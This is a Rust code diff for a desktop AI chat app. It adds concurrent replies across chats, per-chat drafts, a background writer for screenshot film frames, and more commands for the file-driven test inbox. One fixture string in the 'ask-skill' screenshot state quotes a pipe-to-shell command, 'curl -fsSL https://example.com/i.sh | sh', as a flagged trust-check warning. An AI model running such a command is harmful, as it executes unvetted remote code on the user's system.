@@ -7,6 +7,7 @@ mod chat;
 mod compare;
 mod composer;
 mod dialogs;
+mod drafts;
 mod emoji;
 mod find_bar;
 mod form;
@@ -146,6 +147,10 @@ struct Run {
     /// When the agent last reported anything: a reply gone quiet says so (`chat::wait_rows`).
     heard: Instant,
     saved: Instant,
+    /// The chat itself while another one is on screen: the reply goes on being written into it here.
+    parked: Option<Conversation>,
+    /// When the thought before a new step was shut: the step waits for it to fold (`widgets::FOLD`).
+    folded: Option<Instant>,
 }
 
 /// A chat on its way in from disk.
@@ -184,14 +189,62 @@ struct Shot {
     scrolled: bool,
     /// `APIM_SHOT_FILM=600`: every frame of that many milliseconds is kept instead of one picture, each with the
     /// millisecond it was drawn at. This is how something that moves is looked at.
-    film: Option<(u64, Vec<(u64, Arc<egui::ColorImage>)>)>,
+    film: Option<Film>,
+}
+
+/// A film's frames, written to disk by another thread as they come: with `send` a film runs as long as a reply.
+/// Held in memory until the end, half a minute of a 2400x1720 window ran out of memory (16.5 MB a frame).
+struct Film {
+    length: u64,
+    frames: Option<mpsc::SyncSender<(u64, Arc<egui::ColorImage>)>>,
+    writer: Option<std::thread::JoinHandle<()>>,
+    /// Frames the writer had no room for. They are left out rather than slowing the window being filmed.
+    dropped: usize,
+    /// The next millisecond a frame is taken at: one every 14 ms is enough to see movement, and reading back each
+    /// of 143 frames a second cost the window as much as it cost the writer.
+    next: u64,
+}
+
+impl Film {
+    /// Frames go out as `<stem>-<ms>.jpg` at the window's size in points: a film is for movement, and at full
+    /// pixels a PNG took the writer longer than a frame lasts.
+    fn start(length: u64, path: &std::path::Path, points: [f32; 2]) -> Film {
+        let (tx, rx) = mpsc::sync_channel::<(u64, Arc<egui::ColorImage>)>(48);
+        let path = path.to_path_buf();
+        let writer = std::thread::spawn(move || {
+            let stem = path.file_stem().unwrap_or_default().to_string_lossy().into_owned();
+            for (ms, image) in rx {
+                let [w, h] = image.size;
+                let k = ((w as f32 / points[0]).round() as usize).max(1);
+                let (ow, oh) = (w / k, h / k);
+                // A k by k box of pixels becomes one, in RGB: JPEG keeps no alpha.
+                let mut rgb = vec![0u8; ow * oh * 3];
+                for y in 0..oh {
+                    for x in 0..ow {
+                        let mut sum = [0u32; 3];
+                        for dy in 0..k {
+                            for dx in 0..k {
+                                let c = image.pixels[(y * k + dy) * w + x * k + dx];
+                                (sum[0], sum[1], sum[2]) = (sum[0] + c.r() as u32, sum[1] + c.g() as u32, sum[2] + c.b() as u32);
+                            }
+                        }
+                        let at = (y * ow + x) * 3;
+                        rgb[at..at + 3].copy_from_slice(&sum.map(|v| (v / (k * k) as u32) as u8));
+                    }
+                }
+                let Ok(file) = std::fs::File::create(path.with_file_name(format!("{stem}-{ms:04}.jpg"))) else { continue };
+                let _ = image::codecs::jpeg::JpegEncoder::new_with_quality(std::io::BufWriter::new(file), 92).encode(&rgb, ow as u32, oh as u32, image::ExtendedColorType::Rgb8);
+            }
+        });
+        Film { length, frames: Some(tx), writer: Some(writer), dropped: 0, next: 0 }
+    }
 }
 
 impl Shot {
     fn from_env() -> Option<Shot> {
         let path = PathBuf::from(std::env::var_os("APIM_SHOT")?);
         let size = std::env::var("APIM_SHOT_SIZE").ok().and_then(|s| s.split_once('x').and_then(|(w, h)| Some([w.parse().ok()?, h.parse().ok()?]))).unwrap_or([1280.0, 800.0]);
-        let film = std::env::var("APIM_SHOT_FILM").ok().and_then(|ms| ms.parse().ok()).map(|ms| (ms, Vec::new()));
+        let film = std::env::var("APIM_SHOT_FILM").ok().and_then(|ms| ms.parse().ok()).map(|ms| Film::start(ms, &path, size));
         Some(Shot { path, size, state: std::env::var("APIM_SHOT_STATE").unwrap_or_default(), started: Instant::now(), asked: false, acted: false, scrolled: false, film })
     }
 }
@@ -204,15 +257,16 @@ pub struct App {
     boot: Option<splash::Boot>,
     /// The chat on screen.
     conv: Conversation,
-    /// The chat a reply is still being written to, when the user has switched away from it.
-    parked: Option<Conversation>,
-    run: Option<Run>,
+    /// The replies being written, one a chat at most. A chat that is not on screen travels in its run (`Run::parked`).
+    runs: Vec<Run>,
     summary_job: Option<SummaryJob>,
     /// Chats whose model declined the automatic summary: not asked again until the app restarts.
     summary_declined: std::collections::HashSet<String>,
     procs: Arc<Procs>,
+    /// What the message box holds for the chat on screen. Every other chat's is in `drafts`.
     draft: String,
     attachments: Vec<attachments::Pending>,
+    drafts: drafts::Drafts,
     /// The question being edited in place: (message id, draft).
     editing: Option<(String, String)>,
     /// A long code block opened in the side viewer.
@@ -232,6 +286,12 @@ pub struct App {
     anchor: f32,
     /// How tall the transcript was when it was last laid out.
     scroll_end: f32,
+    /// The least the transcript is tall: the most it has been while a reply in it ran (`chat::messages`).
+    floor: f32,
+    /// The transcript follows its end: it was there, or is gliding to it (`chat::messages`).
+    at_end: bool,
+    /// How the transcript, following its end, glides there.
+    follow: widgets::Follow,
     /// The chat being read from disk, so a long one does not hold up the window.
     opening: Option<Opening>,
     /// When a chat was asked for that is not on screen at its end yet: read, then measured, then landed on.
@@ -320,13 +380,13 @@ impl App {
             chats: if boot.is_some() { Vec::new() } else { Conversation::list() },
             boot,
             conv: Conversation::new(),
-            parked: None,
-            run: None,
+            runs: Vec::new(),
             summary_job: None,
             summary_declined: Default::default(),
             procs: Arc::new(Procs::default()),
             draft: String::new(),
             attachments: Vec::new(),
+            drafts: drafts::Drafts::load(),
             editing: None,
             artifact: None,
             lightbox: None,
@@ -337,6 +397,9 @@ impl App {
             scroll_y: 0.0,
             anchor: 0.0,
             scroll_end: 0.0,
+            floor: 0.0,
+            at_end: true,
+            follow: widgets::Follow::default(),
             opening: None,
             arriving: None,
             entered: None,
@@ -380,6 +443,7 @@ impl App {
             search: Default::default(),
             settings,
         };
+        drafts::start(&mut app);
         app.stage_shot();
         app
     }
@@ -464,21 +528,21 @@ impl App {
                 "open-step" => bubble::SHOT_OPEN_STEP.store(true, std::sync::atomic::Ordering::Relaxed),
                 "wait-retry" => {
                     self.fake_run(false);
-                    self.run.as_mut().unwrap().retry = Some(("The provider is overloaded (503) — retrying, try 2 of 3".into(), Instant::now() + Duration::from_secs(8)));
+                    self.runs.last_mut().unwrap().retry = Some(("The provider is overloaded (503) — retrying, try 2 of 3".into(), Instant::now() + Duration::from_secs(8)));
                 }
                 "wait-size" | "wait-model" => {
                     self.fake_run(part == "wait-model");
                     let buckets = [("history", 310_000), ("tool results", 96_000), ("instructions", 9_400), ("media", 2_800_000)].map(|(label, chars)| Bucket { label: label.into(), chars });
-                    self.run.as_mut().unwrap().request = Some(Round { number: if part == "wait-model" { 3 } else { 1 }, buckets: buckets.to_vec(), fired: Instant::now(), answered: false });
+                    self.runs.last_mut().unwrap().request = Some(Round { number: if part == "wait-model" { 3 } else { 1 }, buckets: buckets.to_vec(), fired: Instant::now(), answered: false });
                 }
                 "draft-row" => {
                     self.fake_run(true);
-                    self.run.as_mut().unwrap().drafting = Some(Drafting { name: "write_file".into(), chars: 4210, path: Some("desktop/src/ui/chat.rs".into()), since: Instant::now() });
+                    self.runs.last_mut().unwrap().drafting = Some(Drafting { name: "write_file".into(), chars: 4210, path: Some("desktop/src/ui/chat.rs".into()), since: Instant::now() });
                 }
                 "stalled" => {
                     // Text came, then nothing for five seconds.
                     self.fake_run(true);
-                    let run = self.run.as_mut().unwrap();
+                    let run = self.runs.last_mut().unwrap();
                     (run.status, run.heard) = ("Writing", Instant::now().checked_sub(Duration::from_secs(5)).unwrap_or_else(Instant::now));
                 }
                 "ask-skill" => {
@@ -486,14 +550,14 @@ impl App {
                     self.fake_run(false);
                     let (reply, _) = oneshot::channel();
                     let check = "caveman\nfrom github.com/JuliusBrussee/caveman · 110k stars · Apache-2.0 · last changed 2026-10-09 · in apiM's catalog\ncommit 2e08b9177c · 4,429 characters of instructions · 1 more file\nTrust check: Read the lines below before using it.\n- SKILL.md line 12: downloads code and runs it in one step — \"curl -fsSL https://example.com/i.sh | sh\"";
-                    self.run.as_mut().unwrap().approval = Some(PendingApproval { command: check.into(), reason: "The trust check found something. Its instructions will be followed in the chats you put it on.".into(), key: "skill-add:JuliusBrussee/caveman".into(), mcp: false, reply });
+                    self.runs.last_mut().unwrap().approval = Some(PendingApproval { command: check.into(), reason: "The trust check found something. Its instructions will be followed in the chats you put it on.".into(), key: "skill-add:JuliusBrussee/caveman".into(), mcp: false, reply });
                 }
                 "ask-look" => {
                     // The assistant wants to read a folder outside the chat's own and waits for a yes.
                     self.fake_run(false);
                     let (reply, _) = oneshot::channel();
                     let folder = r"C:\Users\you\AppData\Local\SomeGame\logs";
-                    self.run.as_mut().unwrap().approval = Some(PendingApproval { command: folder.into(), reason: "To look at files outside this chat's folder. Nothing there is changed.".into(), key: format!("look:{}", folder.to_lowercase()), mcp: false, reply });
+                    self.runs.last_mut().unwrap().approval = Some(PendingApproval { command: folder.into(), reason: "To look at files outside this chat's folder. Nothing there is changed.".into(), key: format!("look:{}", folder.to_lowercase()), mcp: false, reply });
                 }
                 "btw" => {
                     // A note passed to the running reply: a quiet line above it, at once.
@@ -558,7 +622,7 @@ impl App {
     /// A reply that never arrives, for self-portraits of the rows that wait on one.
     /// Nothing is sent and nothing is saved: the messages it adds live in memory only.
     fn fake_run(&mut self, with_output: bool) {
-        if self.run.is_some() {
+        if self.running_here() {
             return;
         }
         if !with_output {
@@ -568,7 +632,7 @@ impl App {
             self.conv.messages.push(reply);
         }
         let (_tx, rx) = mpsc::channel();
-        self.run = Some(Run {
+        self.runs.push(Run {
             rx,
             inbox: Default::default(),
             typing: Default::default(),
@@ -586,6 +650,8 @@ impl App {
             heard: Instant::now(),
             // Far enough ahead that the checkpoint never writes this chat to disk.
             saved: Instant::now() + Duration::from_secs(3600),
+            parked: None,
+            folded: None,
         });
     }
 
@@ -595,7 +661,12 @@ impl App {
     }
 
     fn running_here(&self) -> bool {
-        self.run.as_ref().is_some_and(|r| r.conv_id == self.conv.id)
+        self.runs.iter().any(|r| r.conv_id == self.conv.id)
+    }
+
+    /// A chat whose reply is being written while another is on screen.
+    fn parked(&self, id: &str) -> Option<&Conversation> {
+        self.runs.iter().find_map(|r| r.parked.as_ref().filter(|p| p.id == id))
     }
 
     fn toggle_popover(&mut self, which: Popover) {
@@ -608,7 +679,7 @@ impl App {
         if self.conv.id == id {
             change(&mut self.conv);
             self.conv.save();
-        } else if let Some(parked) = self.parked.as_mut().filter(|p| p.id == id) {
+        } else if let Some(parked) = self.runs.iter_mut().find_map(|r| r.parked.as_mut().filter(|p| p.id == id)) {
             change(parked);
             parked.save();
         } else if let Some(mut conv) = Conversation::load(id) {
@@ -622,8 +693,13 @@ impl App {
 
     /// Leaves the chat on screen, keeping it alive if a reply is still being written to it.
     fn leave_current(&mut self) {
-        if self.running_here() {
-            self.parked = Some(std::mem::take(&mut self.conv));
+        drafts::stash(self);
+        // A new chat nothing was sent from is the one "New chat" comes back to.
+        if self.conv.messages.is_empty() {
+            self.drafts.left_blank(&self.conv.id);
+        }
+        if let Some(run) = self.runs.iter_mut().find(|r| r.conv_id == self.conv.id) {
+            run.parked = Some(std::mem::take(&mut self.conv));
         }
         self.forget_layout();
         self.opening = None;
@@ -635,6 +711,8 @@ impl App {
         self.show_summary = false;
         self.jump_to_latest = true;
         self.mounted = 60;
+        // A notice speaks of the chat it was said in: "Undo file changes" would undo them in the next one.
+        self.slash.notice = None;
     }
 
     fn new_chat(&mut self) {
@@ -643,15 +721,25 @@ impl App {
             return;
         }
         self.leave_current();
-        self.conv = Conversation::new();
+        self.conv = self.blank_chat();
         self.arriving = None;
+        drafts::unstash(self);
+    }
+
+    /// A chat with nothing in it: the one left blank earlier, so what was typed and attached there comes back.
+    fn blank_chat(&mut self) -> Conversation {
+        let mut conv = Conversation::new();
+        if let Some(id) = self.drafts.blank.take().filter(|id| !self.chats.iter().any(|c| &c.id == id)) {
+            conv.id = id;
+        }
+        conv
     }
 
     /// Heights belong to the chat on screen: another chat starts with none.
     fn forget_layout(&mut self) {
         self.heights.clear();
         self.rows.clear();
-        (self.scroll_y, self.anchor, self.scroll_end) = (0.0, 0.0, 0.0);
+        (self.scroll_y, self.anchor, self.scroll_end, self.floor, self.follow) = (0.0, 0.0, 0.0, 0.0, widgets::Follow::default());
     }
 
     /// Something about the messages changed: they keep their room until each is measured again.
@@ -675,7 +763,7 @@ impl App {
             return;
         }
         self.arriving = Some(Instant::now());
-        if let Some(parked) = self.parked.take_if(|p| p.id == id) {
+        if let Some(parked) = self.runs.iter_mut().find_map(|r| r.parked.take_if(|p| p.id == id)) {
             return self.show_chat(parked);
         }
         let (tx, rx) = mpsc::channel();
@@ -697,16 +785,19 @@ impl App {
         self.conv = conv;
         self.editing = None;
         self.jump_to_latest = true;
+        drafts::unstash(self);
     }
 
     fn delete_chats(&mut self, ids: &[String]) {
         for id in ids {
-            if self.run.as_ref().is_some_and(|r| &r.conv_id == id) {
-                self.stop();
-            }
+            self.stop_chat(id);
             Conversation::delete(id);
+            self.drafts.forget(id);
             if &self.conv.id == id {
-                self.conv = Conversation::new();
+                (self.draft, self.attachments) = (String::new(), Vec::new());
+                drafts::forget_undo(self);
+                self.conv = self.blank_chat();
+                drafts::unstash(self);
                 self.forget_layout();
                 self.entered = None;
                 self.files_stale = true;
@@ -716,11 +807,17 @@ impl App {
         self.side.finish_selecting();
     }
 
-    fn rename_chat(&mut self, id: &str, title: &str) {
+    /// Err says why the chat keeps its name.
+    fn rename_chat(&mut self, id: &str, title: &str) -> Result<(), String> {
         let title = title.trim().to_string();
+        // The chat's folders are named after its title and move with it, from under a reply that holds the old paths.
+        if self.runs.iter().any(|r| r.conv_id == id) {
+            return Err("A chat can be renamed once its reply has finished.".into());
+        }
         if !title.is_empty() {
             self.with_chat(id, |c| c.title = title);
         }
+        Ok(())
     }
 
     fn archive_chat(&mut self, id: &str, archived: bool) {
@@ -729,7 +826,7 @@ impl App {
 
     /// "Download": the chat as a file, wherever the user wants it.
     fn export_chat(&mut self, id: &str, format: &str) {
-        let conv = if self.conv.id == id { Some(self.conv.clone()) } else { Conversation::load(id) };
+        let conv = if self.conv.id == id { Some(self.conv.clone()) } else { self.parked(id).cloned().or_else(|| Conversation::load(id)) };
         let Some(conv) = conv else { return };
         let Some(path) = rfd::FileDialog::new().set_file_name(export::filename(&conv.title, format)).save_file() else { return };
         match std::fs::write(&path, export::render(&conv, format)) {
@@ -864,14 +961,12 @@ impl App {
     }
 
     /// Older turns are folded into the summary once enough of them have piled up behind the newest eight.
-    fn refresh_summary(&mut self, ctx: &egui::Context, conv_id: &str) {
+    /// `parked` is the chat when it is not the one on screen.
+    fn refresh_summary(&mut self, ctx: &egui::Context, conv_id: &str, parked: Option<&Conversation>) {
         if self.summary_job.is_some() || self.summary_declined.contains(conv_id) {
             return;
         }
-        let conv = match &self.parked {
-            Some(parked) if parked.id == conv_id => parked,
-            _ => &self.conv,
-        };
+        let conv = parked.unwrap_or(&self.conv);
         let shape = summary::shape(&conv.messages, conv.summary.as_ref());
         if conv.id != conv_id || !summary::should_refresh(&shape.pending, crate::models::cache_is_cheap(&self.settings.model, &self.settings.custom_models)) {
             return;
@@ -932,10 +1027,6 @@ impl App {
         if text.is_empty() && self.attachments.is_empty() {
             return;
         }
-        if self.run.is_some() {
-            slash_menu::say(self, "Another chat is still being answered. Stop it or wait for it to finish.", false);
-            return;
-        }
         if self.compacting() {
             return;
         }
@@ -959,7 +1050,7 @@ impl App {
     /// Hands a note to the reply being written without stopping it ("btw …", `/btw`). It shows in the chat at
     /// once, as a quiet line above the reply; the reply reads it before its next step.
     fn pass_note(&mut self, note: String) {
-        let Some(run) = self.run.as_ref().filter(|run| run.conv_id == self.conv.id) else { return };
+        let Some(run) = self.runs.iter().find(|run| run.conv_id == self.conv.id) else { return };
         // ponytail: a picture on a note is described (or, on a native model, left out) rather than sent as pixels. Send it as a picture part if notes with screenshots matter.
         let (wire, attached) = attachments::message(&note, std::mem::take(&mut self.attachments), attachments::model_vision(&self.settings));
         run.notes.lock().unwrap().push(wire.clone());
@@ -1016,6 +1107,9 @@ impl App {
         self.conv.updated_at = store::now_ms();
         self.conv.save();
         self.refresh_chats();
+        // At once, not after the box's usual pause: a window closed in that pause opened next time on an empty
+        // chat under this one's id, and its first message was saved over this one.
+        drafts::keep(self, true);
 
         let request = agent::Request {
             settings: self.settings.clone(),
@@ -1055,7 +1149,7 @@ impl App {
         let wake = ctx.clone();
         let notes = request.notes.clone();
         let handle = self.rt.spawn(agent::run(request, Emitter::new(tx, move || wake.request_repaint()), self.procs.clone()));
-        self.run = Some(Run {
+        self.runs.push(Run {
             rx,
             inbox: Default::default(),
             typing: Default::default(),
@@ -1072,6 +1166,8 @@ impl App {
             started,
             heard: Instant::now(),
             saved: Instant::now(),
+            parked: None,
+            folded: None,
         });
         self.focus_composer = true;
         self.jump_to_latest = true;
@@ -1085,7 +1181,7 @@ impl App {
         let none = || "There is no interrupted reply to resume.".to_string();
         // Only the last message, and only under a question: anything looser would continue something the user has moved on from.
         let [.., before, last] = self.conv.messages.as_slice() else { return Err(none()) };
-        if self.run.is_some() || self.compacting() || last.role != Role::Assistant || before.role != Role::User {
+        if self.running_here() || self.compacting() || last.role != Role::Assistant || before.role != Role::User {
             return Err(none());
         }
         let prior = last.to_web();
@@ -1123,7 +1219,7 @@ impl App {
 
     /// Drops the last reply and asks the same question again.
     fn retry(&mut self, ctx: &egui::Context) {
-        if self.run.is_some() || self.conv.messages.last().is_none_or(|m| m.role != Role::Assistant) {
+        if self.running_here() || self.conv.messages.last().is_none_or(|m| m.role != Role::Assistant) {
             return;
         }
         // The reply being replaced stays on the new one, to compare the two.
@@ -1136,6 +1232,8 @@ impl App {
         }
         if let Some(question) = self.conv.messages.pop() {
             self.remeasure();
+            // The room kept under the reply was the old reply's: kept, the new one began under a screen of blank.
+            self.floor = 0.0;
             self.send(ctx, question.text(), question.attachments);
         }
     }
@@ -1157,6 +1255,7 @@ impl App {
         let Some((start, end)) = self.exchange(id) else { return };
         self.conv.messages.drain(start..end);
         self.remeasure();
+        self.floor = 0.0;
         self.conv.updated_at = store::now_ms();
         self.conv.save();
         self.refresh_chats();
@@ -1192,6 +1291,7 @@ impl App {
         }
         let removed = self.conv.messages.len() - at;
         self.conv.messages.truncate(at);
+        self.floor = 0.0;
         // A summary that stood in for turns now gone would describe a chat that no longer exists.
         if self.conv.summary.as_ref().is_some_and(|s| !self.conv.messages.iter().any(|m| m.id == s.up_to_id)) {
             self.conv.summary = None;
@@ -1227,20 +1327,29 @@ impl App {
 
     /// Asks an earlier question again with new words: it and everything after it are replaced.
     fn resend_edited(&mut self, ctx: &egui::Context, id: &str, text: String) {
-        if self.run.is_some() || self.compacting() {
+        if self.running_here() || self.compacting() {
             return;
         }
         let Some((start, _)) = self.exchange(id) else { return };
         let attached = std::mem::take(&mut self.conv.messages[start].attachments);
         self.conv.messages.truncate(start);
         self.remeasure();
+        self.floor = 0.0;
         self.send(ctx, text, attached);
     }
 
+    /// The Stop button: the reply of the chat on screen.
     fn stop(&mut self) {
-        let Some(mut run) = self.run.take() else { return };
+        let id = self.conv.id.clone();
+        self.stop_chat(&id);
+    }
+
+    /// Stops a chat's reply where it stands. What it had written is kept.
+    fn stop_chat(&mut self, id: &str) {
+        let Some(at) = self.runs.iter().position(|r| r.conv_id == id) else { return };
+        let mut run = self.runs.remove(at);
         run.handle.abort();
-        let conv = match self.parked.as_mut() {
+        let conv = match run.parked.as_mut() {
             Some(parked) => parked,
             None => &mut self.conv,
         };
@@ -1264,22 +1373,44 @@ impl App {
         }
         conv.updated_at = store::now_ms();
         conv.save();
-        self.parked = None;
         self.files_stale = true;
         self.refresh_chats();
     }
 
-    /// Applies everything the agent reported since the last frame.
+    /// Applies everything the agents reported since the last frame, in every chat that has a reply running.
     fn pump(&mut self, ctx: &egui::Context) {
-        let Some(run) = self.run.as_mut() else { return };
+        let mut runs = std::mem::take(&mut self.runs);
+        let mut ended = Vec::new();
+        let mut i = 0;
+        while i < runs.len() {
+            if self.pump_run(ctx, &mut runs[i]) {
+                ended.push(runs.remove(i));
+            } else {
+                i += 1;
+            }
+        }
+        self.runs = runs;
+        for run in &ended {
+            self.refresh_summary(ctx, &run.conv_id, run.parked.as_ref());
+        }
+        if !ended.is_empty() {
+            self.files_stale = true;
+            self.refresh_chats();
+            ctx.send_viewport_cmd(egui::ViewportCommand::RequestUserAttention(egui::UserAttentionType::Informational));
+        }
+    }
+
+    /// Takes in what one reply reported. True when it has ended.
+    fn pump_run(&mut self, ctx: &egui::Context, run: &mut Run) -> bool {
         for event in run.rx.try_iter() {
             run.heard = Instant::now();
-            // Anything coming back answers the request that was waiting, and ends a retry's countdown.
+            // Anything coming back ends a retry's countdown. Text answers the request that was waiting once it is typed
+            // out (below): its first byte can come well before its first word shows, and the row said nothing between.
             if matches!(event, Event::Reasoning(_) | Event::Content(_) | Event::ToolDraft { .. } | Event::ToolStart(_)) {
                 run.retry = None;
-                if let Some(request) = &mut run.request {
-                    request.answered = true;
-                }
+            }
+            if let Some(request) = run.request.as_mut().filter(|_| matches!(event, Event::ToolDraft { .. } | Event::ToolStart(_))) {
+                request.answered = true;
             }
             // The pace is set by when text comes in, wherever it stands in line.
             if let Event::Reasoning(text) | Event::Content(text) = &event {
@@ -1288,8 +1419,8 @@ impl App {
             run.inbox.push_back(event);
         }
         // A reply to a chat that is not the one on screen has nobody to type for, and neither has a window that is down.
-        let watched = self.parked.is_none() && ctx.input(|i| i.viewport().visible()) != Some(false);
-        let conv = match self.parked.as_mut() {
+        let watched = run.parked.is_none() && ctx.input(|i| i.viewport().visible()) != Some(false);
+        let conv = match run.parked.as_mut() {
             Some(parked) => parked,
             None => &mut self.conv,
         };
@@ -1311,6 +1442,18 @@ impl App {
                     for (prose, text) in run.typing.release_all() {
                         write_text(msg, &mut run.thinking, prose, text);
                     }
+                }
+            }
+            // A thought still open when a step or a notice comes is shut first, and the row comes in once it has
+            // folded. Both in one frame was one jolt: the thought shut, the step appeared, all under them moved.
+            if watched && matches!(run.inbox.front(), Some(Event::ToolStart(_) | Event::Notice(_))) {
+                if let Some(msg) = conv.messages.last_mut().filter(|m| thinking_now(m)) {
+                    close_thinking(msg, &mut run.thinking);
+                    run.folded = Some(Instant::now());
+                }
+                if let Some(left) = run.folded.and_then(|at| FOLD_WAIT.checked_sub(at.elapsed())) {
+                    ctx.request_repaint_after(left);
+                    break;
                 }
             }
             let Some(event) = run.inbox.pop_front() else { break };
@@ -1454,9 +1597,33 @@ impl App {
         }
         // This frame's share of the text. With a row waiting behind it, it is typed out quickly instead.
         if let Some(msg) = conv.messages.last_mut().filter(|_| !finished) {
-            let pieces = if watched { run.typing.release(!run.inbox.is_empty()) } else { run.typing.release_all() };
+            // The reply's words after a thought wait for it to fold, as a step does: typed under the open box, they
+            // slid up by its height as it shut.
+            if watched && run.typing.prose_next() && thinking_now(msg) {
+                close_thinking(msg, &mut run.thinking);
+                run.folded = Some(Instant::now());
+            }
+            let folding = run.folded.and_then(|at| FOLD_WAIT.checked_sub(at.elapsed())).filter(|_| watched && run.typing.prose_next());
+            let pieces = match folding {
+                Some(left) => {
+                    run.typing.hold();
+                    ctx.request_repaint_after(left);
+                    Vec::new()
+                }
+                None if watched => run.typing.release(!run.inbox.is_empty()),
+                None => run.typing.release_all(),
+            };
             for (prose, text) in pieces {
                 write_text(msg, &mut run.thinking, prose, text);
+                if let Some(request) = &mut run.request {
+                    request.answered = true;
+                }
+            }
+            // A tool call being written means the thinking before it is over: it folds now, while the call streams
+            // in, not when the step starts. Not before all of it is on screen, or the rest would open a second one.
+            if run.drafting.is_some() && !run.typing.waiting() && thinking_now(msg) {
+                close_thinking(msg, &mut run.thinking);
+                run.folded = Some(Instant::now());
             }
             if run.typing.waiting() || !run.inbox.is_empty() {
                 ctx.request_repaint();
@@ -1480,15 +1647,7 @@ impl App {
             conv.updated_at = store::now_ms();
             conv.save();
         }
-        if finished {
-            let conv_id = run.conv_id.clone();
-            self.run = None;
-            self.refresh_summary(ctx, &conv_id);
-            self.parked = None;
-            self.files_stale = true;
-            self.refresh_chats();
-            ctx.send_viewport_cmd(egui::ViewportCommand::RequestUserAttention(egui::UserAttentionType::Informational));
-        }
+        finished
     }
 
     // ------------------------------------------------------------ attaching
@@ -1536,7 +1695,7 @@ impl App {
                 return;
             }
             if let Ok(picture) = clipboard.get_image() {
-                let path = std::env::temp_dir().join("apim-paste").join(format!("pasted-{}.png", store::new_id()));
+                let path = drafts::pasted_dir().join(format!("pasted-{}.png", store::new_id()));
                 let saved = std::fs::create_dir_all(path.parent().unwrap_or(&path)).is_ok() && image::save_buffer(&path, &picture.bytes, picture.width as u32, picture.height as u32, image::ColorType::Rgba8).is_ok();
                 match saved {
                     true => attachments::add(self, path),
@@ -1582,7 +1741,8 @@ impl App {
 
     /// `APIM_SHOT_INBOX=file`: whoever drives a `send` self-portrait is its user through this file. One command
     /// a file, taken when it can be acted on and then deleted: `answer <text>` and `skip` for the question on
-    /// screen, `note <text>` for a "btw" to the running reply, `stop` for the Stop button.
+    /// screen, `note <text>` for a "btw" to the running reply, `stop` for the Stop button, and `type <text>`,
+    /// `attach <path>`, `open <part of a title>`, `new` and `send` for moving between chats.
     fn take_inbox(&mut self) {
         static LOOKED: Mutex<Option<Instant>> = Mutex::new(None);
         if self.shot.is_none() || LOOKED.lock().unwrap().is_some_and(|at| at.elapsed() < Duration::from_millis(300)) {
@@ -1593,14 +1753,37 @@ impl App {
         let Ok(said) = std::fs::read_to_string(&path) else { return };
         let (verb, text) = said.trim().split_once(char::is_whitespace).unwrap_or((said.trim(), ""));
         let done = match verb {
-            "answer" | "skip" => self.run.as_mut().and_then(|run| run.question.take()).map(|asked| asked.reply.send(if verb == "skip" { String::new() } else { text.trim().to_string() })).is_some(),
-            "allow" | "deny" => self.run.as_mut().and_then(|run| run.approval.take()).map(|asked| (asked.reply.send(verb == "allow"), std::fs::remove_file(path.with_extension("ask")))).is_some(),
+            "answer" | "skip" => self.runs.iter_mut().find_map(|run| run.question.take()).map(|asked| asked.reply.send(if verb == "skip" { String::new() } else { text.trim().to_string() })).is_some(),
+            "allow" | "deny" => self.runs.iter_mut().find_map(|run| run.approval.take()).map(|asked| (asked.reply.send(verb == "allow"), std::fs::remove_file(path.with_extension("ask")))).is_some(),
             "note" if self.running_here() => {
                 self.pass_note(text.trim().to_string());
                 true
             }
-            "stop" if self.run.is_some() => {
+            "stop" if self.running_here() => {
                 self.stop();
+                true
+            }
+            // What a hand does between chats: type into the box, attach, open a chat by a part of its title, start a new one, send.
+            "type" => {
+                self.draft = text.to_string();
+                true
+            }
+            "attach" => {
+                attachments::add(self, PathBuf::from(text.trim()));
+                true
+            }
+            "open" => {
+                let wanted = text.trim().to_lowercase();
+                let found = self.chats.iter().find(|c| c.title.to_lowercase().contains(&wanted)).map(|c| c.id.clone());
+                found.inspect(|id| self.open_chat(id)).is_some()
+            }
+            "new" => {
+                self.new_chat();
+                true
+            }
+            "send" => {
+                let ctx = self.ctx.clone();
+                self.submit(&ctx);
                 true
             }
             _ => false,
@@ -1639,28 +1822,36 @@ impl App {
                 self.toggle_fullscreen(ctx);
             }
         }
-        if self.staged("send") && (self.run.is_some() || self.summary_job.is_some()) {
+        // A film of a `send` is of the reply itself: it does not wait for the end.
+        let filmed = self.shot.as_ref().is_some_and(|shot| shot.film.is_some());
+        if self.staged("send") && !filmed && (!self.runs.is_empty() || self.summary_job.is_some()) {
             self.shot.as_mut().unwrap().started = Instant::now() - Duration::from_millis(400);
             return;
         }
         let Some(shot) = self.shot.as_mut() else { return };
-        if let Some((length, frames)) = shot.film.as_mut() {
-            // Filmed from the click of a `click-X-Y`, or from the window's first frame.
-            let from = if shot.state.contains("click-") { 380 } else { 0 };
+        if let Some(film) = shot.film.as_mut() {
+            // Filmed from the click of a `click-X-Y`, from the moment a `send` sends, or from the window's first frame.
+            let from = if shot.state.contains("click-") { 380 } else if shot.state.split(',').any(|part| part == "send") { 300 } else { 0 };
             let at = shot.started.elapsed().as_millis() as u64;
-            frames.extend(ctx.input(|i| {
-                let frame = |event: &egui::Event| match event {
-                    egui::Event::Screenshot { image, user_data, .. } => Some((*user_data.data.as_ref()?.downcast_ref::<u64>()?, image.clone())),
-                    _ => None,
-                };
-                i.events.iter().filter_map(frame).collect::<Vec<_>>()
-            }));
-            if (from..from + *length).contains(&at) {
-                ctx.send_viewport_cmd(egui::ViewportCommand::Screenshot(egui::UserData::new(at - from)));
-            } else if at > from + *length + 150 {
-                for (ms, image) in frames.iter() {
-                    let name = format!("{}-{ms:04}.png", shot.path.file_stem().unwrap_or_default().to_string_lossy());
-                    let _ = image::save_buffer(shot.path.with_file_name(name), image.as_raw(), image.size[0] as u32, image.size[1] as u32, image::ColorType::Rgba8);
+            ctx.input(|i| {
+                for event in &i.events {
+                    if let (egui::Event::Screenshot { image, user_data, .. }, Some(tx)) = (event, &film.frames) {
+                        if let Some(ms) = user_data.data.as_ref().and_then(|data| data.downcast_ref::<u64>()) {
+                            film.dropped += usize::from(tx.try_send((*ms, image.clone())).is_err());
+                        }
+                    }
+                }
+            });
+            if (from..from + film.length).contains(&at) {
+                if at >= film.next {
+                    film.next = at + 14;
+                    ctx.send_viewport_cmd(egui::ViewportCommand::Screenshot(egui::UserData::new(at - from)));
+                }
+            } else if at > from + film.length + 150 {
+                film.frames = None;
+                if let Some(writer) = film.writer.take() {
+                    let _ = writer.join();
+                    eprintln!("film: {} frames left out, the writer was behind", film.dropped);
                 }
                 ctx.send_viewport_cmd(egui::ViewportCommand::Close);
             }
@@ -1705,13 +1896,15 @@ impl eframe::App for App {
             self.side.arrive();
         }
         self.take_inbox();
+        drafts::keep(self, false);
